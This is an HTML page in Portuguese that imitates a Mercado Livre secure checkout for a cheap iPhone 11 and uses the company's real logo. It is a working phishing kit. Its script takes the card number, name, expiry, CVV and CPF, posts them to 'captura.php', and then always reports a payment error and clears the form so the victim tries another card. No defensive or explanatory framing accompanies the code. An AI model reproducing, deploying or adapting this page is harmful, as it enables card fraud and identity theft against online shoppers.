<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Pagamento Seguro - Mercado Livre</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 500px; margin: 0 auto; }
        .header { background: #fff; padding: 20px; text-align: center; border-radius: 12px; }
        .logo { width: 60px; margin-bottom: 10px; }
        .valor { font-size: 28px; font-weight: bold; color: #00a650; }
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
        .input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; }
        .row { display: flex; gap: 10px; }
        .row .input-group { flex: 1; }
        .btn-pagar { width: 100%; padding: 15px; background: #3483fa; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        .btn-pagar:hover { background: #2968c8; }
        .error { background: #fee; border: 1px solid #fcc; color: #c00; padding: 12px; border-radius: 8px; margin-bottom: 15px; display: none; }
        .loading { display: none; text-align: center; margin-top: 15px; }
        .spinner { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #3483fa; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png" class="logo">
            <div class="valor">R$ 249,90</div>
            <div>iPhone 11 64GB - Ótimo estado</div>
        </div>

        <div class="form-pagamento">
            <div class="error" id="errorMsg"></div>
            
            <div class="input-group">
                <label>Número do Cartão</label>
                <input type="text" id="numero" placeholder="0000 0000 0000 0000">
            </div>
            <div class="input-group">
                <label>Nome no Cartão</label>
                <input type="text" id="nome" placeholder="Como está no cartão">
            </div>
            <div class="row">
                <div class="input-group">
                    <label>Validade</label>
                    <input type="text" id="validade" placeholder="MM/AAAA">
                </div>
                <div class="input-group">
                    <label>CVV</label>
                    <input type="text" id="cvv" placeholder="123">
                </div>
            </div>
            <div class="input-group">
                <label>CPF</label>
                <input type="text" id="cpf" placeholder="000.000.000-00">
            </div>
            
            <button class="btn-pagar" onclick="enviarDados()">Pagar R$ 249,90</button>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Processando pagamento...</p>
            </div>
        </div>
    </div>

    <script>
        function enviarDados() {
            const numero = document.getElementById('numero').value.replace(/\s/g, '');
            const nome = document.getElementById('nome').value;
            const validade = document.getElementById('validade').value;
            const cvv = document.getElementById('cvv').value;
            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');

            if (!numero || numero.length < 15) {
                mostrarErro('Número do cartão inválido');
                return;
            }
            if (!nome) {
                mostrarErro('Digite o nome no cartão');
                return;
            }
            if (!validade || validade.length < 6) {
                mostrarErro('Data de validade inválida');
                return;
            }
            if (!cvv || cvv.length < 3) {
                mostrarErro('CVV inválido');
                return;
            }
            if (!cpf || cpf.length < 11) {
                mostrarErro('CPF inválido');
                return;
            }

            document.getElementById('loading').style.display = 'block';
            document.querySelector('.btn-pagar').disabled = true;

            const dados = { numero, nome, validade, cvv, cpf };

            fetch('captura.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dados)
            })
            .then(response => response.json())
            .then(() => {
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    mostrarErro('Erro no processamento. Tente outro cartão.');
                    document.querySelector('.btn-pagar').disabled = false;
                    document.querySelectorAll('input').forEach(i => i.value = '');
                }, 2000);
            });
        }

        function mostrarErro(msg) {
            const errorDiv = document.getElementById('errorMsg');
            errorDiv.innerText = msg;
            errorDiv.style.display = 'block';
            setTimeout(() => errorDiv.style.display = 'none', 3000);
        }
    </script>
</body>
</html>
